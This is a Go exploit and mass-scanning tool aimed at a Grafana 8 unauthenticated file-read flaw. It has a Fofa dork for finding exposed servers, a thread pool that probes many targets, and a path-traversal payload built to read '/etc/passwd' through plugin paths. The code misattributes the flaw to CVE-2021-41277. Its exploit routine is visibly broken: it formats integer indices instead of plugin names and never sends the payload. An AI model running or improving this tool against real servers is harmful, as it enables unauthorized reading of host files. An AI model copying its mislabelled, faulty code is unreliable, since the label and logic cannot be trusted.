package main

import (
	"bufio"
	"encoding/json"
	"errors"
	"flag"
	"fmt"
	"github.com/go-resty/resty/v2"
	"github.com/panjf2000/ants/v2"
	"github.com/projectdiscovery/gologger"
	"github.com/projectdiscovery/gologger/levels"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"
)

const (
	// HTTP defines the plain http scheme
	HTTP = "http://"
	// HTTPS defines the secure http scheme
	HTTPS = "https://"
)

var finalresult []string

// VulnInfo contains the Vulnerability information about CVE-2021-41277
type VulnInfo struct {
	Name         string
	VulID        string
	Version      string
	Author       string
	VulDate      string
	References   []string
	AppName      string
	AppPowerLink string
	AppVersion   string
	VulType      string
	Description  string
	Category     string
	Dork         QueryDork
}

type QueryDork struct {
	Fofa    string
	Quake   string
	Zoomeye string
	Shodan  string
}

func showInfo() {
	info := VulnInfo{
		Name:         "Grafana Arbitrary File Read",
		VulID:        "nil",
		Version:      "1.0",
		Author:       "z3",
		VulDate:      "2021-12-07",
		References:   []string{"https://nosec.org/home/detail/4914.html"},
		AppName:      "Grafana",
		AppPowerLink: "https://grafana.com/",
		AppVersion:   "Grafana Version 8.*",
		VulType:      "Arbitrary File Read",
		Description:  "An unauthorized arbitrary file reading vulnerability exists in Grafana, which can be exploited by an attacker to read arbitrary files on the host computer without authentication.",
		Category:     "REMOTE",
		Dork:         QueryDork{Fofa: `app="Grafana"`},
	}

	vulnJson, err := json.MarshalIndent(info, "", "  ")
	if err != nil {
		fmt.Println(err)
	}
	fmt.Print(string(vulnJson))

}

// Options contains the configuration options
type Options struct {
	Verbose     bool   // Verbose flag indicates whether to show verbose output or not
	ShowInfo    bool   //ShowInfo is a flag indicates whether to show vuln info output or not
	Exploit     bool   //ShowInfo is a flag indicates whether to show vuln info output or not
	Stdin       bool   // Stdin specifies whether stdin input was given to the process
	Timeout     int    // Timeout is the seconds to wait for sources to respond
	Target      string // Target to verfity CVE-2021-41277
	TargetsFile string // TargetsFile containing list of targets to verfity
	Threads     int    // Thread controls the number of threads to use for active enumerations
	Output      io.Writer
	OutputFile  string // Output is the file to write found subdomains to.
}

// parseOptions parses the command line flags provided by a user
func parseOptions() *Options {
	options := &Options{}
	flag.BoolVar(&options.Verbose, "v", false, "Show Verbose output")
	flag.BoolVar(&options.ShowInfo, "s", false, "Show VulnInfo output")
	flag.IntVar(&options.Threads, "t", 10, "Number of concurrent goroutines for resolving")
	flag.StringVar(&options.Target, "u", "", "Target to verfity CVE-2021-41277")
	flag.StringVar(&options.TargetsFile, "f", "", "File containing list of targets to verfity")
	flag.StringVar(&options.OutputFile, "o", "", "File to write output to (optional)")
	flag.Parse()

	// Default output is stdout
	options.Output = os.Stdout

	// Check if stdin pipe was given
	options.Stdin = hasStdin()

	if options.ShowInfo {
		gologger.Info().Msg("VulnInfo:\n")
		showInfo()
		os.Exit(0)
	}

	if options.Verbose {
		gologger.DefaultLogger.SetMaxLevel(levels.LevelVerbose)
	} else {
		gologger.DefaultLogger.SetMaxLevel(levels.LevelSilent)
	}

	// Validate the options passed by the user and if any
	// invalid options have been used, exit.
	err := options.validateOptions()
	if err != nil {
		gologger.Fatal().Msgf("Program exiting: %s\n", err)
	}

	return options
}

func hasStdin() bool {
	stat, err := os.Stdin.Stat()
	if err != nil {
		return false
	}

	isPipedFromChrDev := (stat.Mode() & os.ModeCharDevice) == 0
	isPipedFromFIFO := (stat.Mode() & os.ModeNamedPipe) != 0

	return isPipedFromChrDev || isPipedFromFIFO
}

// validateOptions validates the configuration options passed
func (options *Options) validateOptions() error {
	// Check if target, list of targets, or stdin info was provided.
	// If none was provided, then return.
	if options.Target == "" && options.TargetsFile == "" && !options.Stdin {
		return errors.New("no input list provided")
	}

	if options.Threads == 0 {
		return errors.New("threads cannot be zero")
	}

	return nil
}

func targetParser(target string) []string {
	if !(strings.HasPrefix(target, HTTP) || strings.HasPrefix(target, HTTPS)) {
		res := []string{HTTP + target, HTTPS + target}
		return res
	}
	res := []string{target}
	return res
}

func verify(target interface{}) {
	t := target.(string)
	url := t + "/public/plugins/a/a"
	client := resty.New()
	client.SetTimeout(15 * time.Second)
	resp, err := client.R().EnableTrace().Get(url)
	if err != nil {
		gologger.Warning().Msg("Request error: " + t)
	} else {
		if resp.StatusCode() == http.StatusNotFound {
			bodyString := string(resp.Body())
			if strings.Contains(bodyString, "Plugin not found") {
				gologger.Info().Msg(t + " is vulnerable")
				finalresult = append(finalresult, t)
			} else {
				gologger.Warning().Msg("no vulnerable")
			}
		} else {
			gologger.Warning().Msg("no vulnerable")
		}
	}
}

func exploit(target interface{}) {
	t := target.(string)
	var payload string
	plugins := []string{"alertGroups", "alertlist", "alertmanager", "annolist", "barchart", "bargauge", "canvas", "cloudwatch", "dashboard", "dashlist", "debug", "elasticsearch", "gauge", "geomap", "gettingstarted", "grafana-azure-monitor-datasource", "grafana", "graph", "graphite", "heatmap", "histogram", "influxdb", "jaeger", "live", "logs", "loki", "mixed", "mssql", "mysql", "news", "nodeGraph", "opentsdb", "piechart", "pluginlist", "postgres", "prometheus", "stat", "state-timeline", "status-history", "table-old", "table", "tempo", "testdata", "text", "timeseries", "welcome", "xychart", "zipkin"}
	probe := "/public/plugins/%s/../../../../../../../../etc/passwd"
	for plugin := range plugins {
		payload = fmt.Sprintf(probe, plugin)
		fmt.Print(payload)
	}

	url := t + "/public/plugins/a/a"
	client := resty.New()
	client.SetTimeout(15 * time.Second)
	resp, err := client.R().EnableTrace().Get(url)
	if err != nil {
		gologger.Warning().Msg("Request error: " + t)
	} else {
		if resp.StatusCode() == http.StatusNotFound {
			bodyString := string(resp.Body())
			if strings.Contains(bodyString, "Plugin not found") {
				gologger.Info().Msg(t + " is vulnerable")
				finalresult = append(finalresult, t)
			} else {
				gologger.Warning().Msg("no vulnerable")
			}
		} else {
			gologger.Warning().Msg("no vulnerable")
		}
	}
}

func createFile(filename string, appendtoFile bool) (*os.File, error) {
	if filename == "" {
		return nil, errors.New("empty filename")
	}

	dir := filepath.Dir(filename)

	if dir != "" {
		if _, err := os.Stat(dir); os.IsNotExist(err) {
			err := os.MkdirAll(dir, os.ModePerm)
			if err != nil {
				return nil, err
			}
		}
	}

	var file *os.File
	var err error
	if appendtoFile {
		file, err = os.OpenFile(filename, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	} else {
		file, err = os.Create(filename)
	}
	if err != nil {
		return nil, err
	}

	return file, nil
}

func writePlainResult(results []string, writer io.Writer) error {
	bufwriter := bufio.NewWriter(writer)
	sb := &strings.Builder{}

	for _, result := range results {
		sb.WriteString(result)
		sb.WriteString("\n")

		_, err := bufwriter.WriteString(sb.String())
		if err != nil {
			bufwriter.Flush()
			return err
		}
		sb.Reset()
	}
	return bufwriter.Flush()
}

func runner(options *Options) error {
	targets := []string{}
	outputs := []io.Writer{options.Output}

	if options.OutputFile != "" {
		file, err := createFile(options.OutputFile, false)
		if err != nil {
			gologger.Error().Msgf("Could not create file %s for %s: %s\n", options.OutputFile, options.Target, err)
			return err
		}
		defer file.Close()

		outputs = append(outputs, file)
	}

	if options.Target != "" {
		// If output file specified, create file
		targets = targetParser(options.Target)
	}

	if options.TargetsFile != "" {
		reader, err := os.Open(options.TargetsFile)
		if err != nil {
			return err
		}
		scanner := bufio.NewScanner(reader)
		for scanner.Scan() {
			target := scanner.Text()
			if target == "" {
				continue
			}
			targets = append(targets, targetParser(target)...)
		}
		reader.Close()
		return err
	}

	if options.Stdin {
		scanner := bufio.NewScanner(os.Stdin)
		for scanner.Scan() {
			target := scanner.Text()
			if target == "" {
				continue
			}
			targets = append(targets, targetParser(target)...)
		}
	}

	wg := sync.WaitGroup{}

	p, _ := ants.NewPoolWithFunc(options.Threads, func(i interface{}) {
		verify(i)
		wg.Done()
	})
	defer p.Release()
	for _, t := range targets {
		//gologger.Info().Msg(t)
		wg.Add(1)
		_ = p.Invoke(t)
	}
	wg.Wait()

	var err error
	for _, w := range outputs {
		err = writePlainResult(finalresult, w)
		if err != nil {
			gologger.Error().Msgf("Could not verbose results, Error: %s\n", err)
			return err
		}
	}

	return nil
}

func main() {

	// Parse the command line flags
	options := parseOptions()
	//fmt.Print(options)
	err := runner(options)
	if err != nil {
		gologger.Error().Msg("Runner Error")
	}
}